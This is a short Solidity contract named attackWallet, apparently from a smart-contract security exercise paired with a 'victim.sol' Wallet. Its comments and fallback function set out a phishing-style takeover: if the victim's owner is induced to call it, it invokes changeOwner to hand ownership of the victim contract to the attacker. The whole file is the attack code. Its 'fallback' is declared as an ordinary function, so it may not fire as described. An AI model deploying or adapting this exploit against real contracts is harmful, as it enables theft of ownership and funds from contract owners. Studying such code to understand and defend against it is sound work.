pragma solidity ^0.6.0;
import "./victim.sol";
contract attackWallet {         // if this contract is called by the victim contract owner somehow then this
    Wallet victimContractAddr;  // contract will attack the original contract and the owner of attack contract will get
    address owner;              // ownership of victim contract

    constructor(Wallet _victimAddress) public {
        victimContractAddr = Wallet(_victimAddress);
        owner = msg.sender;
    }

    function fallback() public payable {
        victimContractAddr.changeOwner(owner);
    }
}
